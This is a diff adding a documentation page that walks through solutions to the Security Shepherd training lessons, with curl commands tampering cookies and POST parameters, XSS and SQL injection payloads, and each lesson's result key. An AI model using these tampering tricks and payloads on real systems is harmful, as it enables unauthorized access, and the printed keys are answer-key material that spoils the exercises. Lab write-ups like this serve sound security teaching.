@@ -1,0 +1,137 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdLessons:
+
+*******
+Lessons
+*******
+
+Broken Session Management
+=========================
+
+Selecting button :guilabel:`Complete This Lesson` sends a cookie **lessonComplete=lessonNotComplete**. Changing this cookie to **lessonComplete=lessonComplete** gets the result key:
+
+.. code-block:: bash
+  :emphasize-lines: 3
+
+  # Tamper Data provides COOKIE and URL
+  COOKIE='lessonComplete=lessonNotComplete; JSESSIONID=2821E976E0037D81BDB6DE59DAD137B5; token=-112632534499221020130646027487937654472; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  COOKIE=${COOKIE/lessonNotComplete/lessonComplete}
+  URL='https://securityshepherd.com/lessons/b8c19efd1a7cc64301f239f9b9a7a32410a0808138bbefc98986030f9ea83806'
+
+  curl --silent --insecure \
+       --request POST \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       $URL
+
+Yields this output:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this lesson is
+  4Gazx9fYvCwRXzUNBJX7I+GrekCHBOkrBBanfhW5+uNqo1LGoY035sdHeLhc+6r5pfB/fToDbOIc76wZfkImEMMrZwBrOW4jf01y1BE1iM0=
+
+
+Cross Site Request Forgery
+==========================
+
+Selecting button :guilabel:`Send Message` with a URL of **https://securityshepherd.com/root/grantComplete/csrfLesson?userId=-646406028** (where -646406028 is your userid) gets the result key:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this lesson is
+  0cm0fBbpbB2BGJXVCM16j0swGqWh7wltXzgSj8XOoHMZk7YnJvlihgUJ1PdSg7kTLnrGQeoazBNDwCcXU6siXMU+QCUgPKZ3peTBWcUs7xPcSIK+LvwyGAi3zadS6Y1e
+
+
+Cross Site Scripting
+====================
+
+Selecting button :guilabel:`Get this user` with a Search Term of **<script>alert('XSS')</script>** gets the result key.
+
+
+Failure to Restrict URL Access
+==============================
+
+Viewing the page source using Firebug reveals this link:
+
+.. code-block:: html
+
+  <a href="adminOnly/resultKey.jsp"> Administrator Result Page </a>
+
+So all we need do is enter the URL **https://securityshepherd.com/lessons/adminOnly/resultKey.jsp** to get the result key; you have to scroll way down the page to see the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key for this lesson is
+  VpuJe/3NTRrgFF0P86kK0QGG8Z/CTCJGMxNxgLXjs5eeuh5OxxpP24ME5f6w9PnJHrdKEEwLhvgKSDVX9KEoNHX6Ht5UYOQAOClCEyw3NLk=
+
+
+Insecure Cryptographic Storage
+==============================
+
+Run the following to get the result key:
+
+.. code-block:: bash
+
+  BASE64='YmFzZTY0aXNOb3RFbmNyeXB0aW9uQmFzZTY0aXNFbmNvZGluZ0Jhc2U2NEhpZGVzTm90aGluZ0Zyb21Zb3U='
+  echo $BASE64 | base64 -d
+
+The result is "base64isNotEncryptionBase64isEncodingBase64HidesNothingFromYou".
+
+
+Insecure Direct Object References
+=================================
+
+This one is easily solved by changing the posted data **username=guest** to **username=admin**:
+
+.. code-block:: bash
+  :emphasize-lines: 2-3
+
+  # Tamper Data provides POSTDATA, COOKIE, and URL
+  POSTDATA='username=guest'
+  POSTDATA=${POSTDATA/guest/admin}
+  COOKIE='JSESSIONID=2821E976E0037D81BDB6DE59DAD137B5; token=-112632534499221020130646027487937654472; JSESSIONID3="8C2wotxmF6z8gnPFaeTimw=="'
+  URL='https://securityshepherd.com/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100'
+
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "$POSTDATA" \
+       $URL
+
+Yields this output:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Result Key:
+  JgwwHlI1huTRHTb1MSfQv27oS8vE52v230gTpOntH/S4ykruG7EGfaE5JYb7RHnMVjkkUDJ6DmQNgkY0Jpq/R4rzXXPaToQYBWqtkL7Yrwc=
+
+
+SQL Injection
+=============
+
+This one is easily solved by entering **'OR'1'='1**, returning all the rows including the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  3c17f6bf34080979e0cebda5672e989c07ceec9fa4ee7b7c17c9e3ce26bc63e0
+
+
+Unvalidated Redirects and Forwards
+==================================
+
+Entering the link **https://securityshepherd.com/user/redirect?to=https://securityshepherd.com/root/grantComplete/unvalidatedredirectlesson?userid=-396055212**  (where -396055212 is the temporary ID), then clicking :guilabel:`Send Message` will get the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  mTvnudmDdMxRHM57N2Xftyfn6N8wpYze/rQNyc7C3wjVpgyLDeflBUt7Vok6wSU1mk1smsRmgBE409I0nyV7L5eVs1JuU4pK3bgb9+gXtIw=
+
